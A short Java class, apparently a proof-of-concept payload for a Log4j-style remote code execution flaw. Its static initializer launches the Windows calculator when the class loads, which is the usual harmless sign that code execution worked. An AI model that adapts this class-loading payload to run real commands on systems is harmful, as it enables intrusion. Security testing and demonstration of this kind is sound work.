public class log4zdv {
  static {
    try {
      Runtime.getRuntime().exec("calc.exe").waitFor();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
